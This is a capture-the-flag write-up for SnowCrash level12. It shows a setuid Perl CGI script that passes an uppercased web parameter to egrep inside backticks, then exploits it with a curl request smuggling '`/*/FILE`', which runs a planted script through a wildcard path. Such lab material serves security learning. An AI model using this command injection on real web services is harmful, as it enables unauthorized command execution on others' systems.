```bash
level12@SnowCrash:~$ ll
total 16
dr-xr-x---+ 1 level12 level12  120 Mar  5  2016 ./
d--x--x--x  1 root    users    340 Aug 30  2015 ../
-r-x------  1 level12 level12  220 Apr  3  2012 .bash_logout*
-r-x------  1 level12 level12 3518 Aug 30  2015 .bashrc*
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl*
-r-x------  1 level12 level12  675 Apr  3  2012 .profile*
```
This one is not really hard but You have to keep in mind this flipping backticks
```bash
level12@SnowCrash:~$ cat level12.pl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```
So here the interesting part is only the @output.
We see that the egrep command is used within backticks so we exec a new subcommand
We can also see than what We as a user give to the argv, is being put in full_maj
which means that we can't write the command itself, what to do now ?
we have to find a way to exec a command that wont be put in full maj so let's write it within a file

```bash
level12@SnowCrash:~$ vim /tmp/FILE
level12@SnowCrash:~$ chmod +x /tmp/FILE
level12@SnowCrash:~$ cat /tmp/FILE
#!/bin/bash

getflag > /tmp/flag
level12@SnowCrash:~$ curl localhost:4646/?x='`/*/FILE`'
```
so the important parts here :
when you put a backtick in shell and you don't want it to be read instantly you put it within SINGLE quote
we put a wildcard to be sure that it doesn't get full_majed
GG you can cat your /tmp/flag
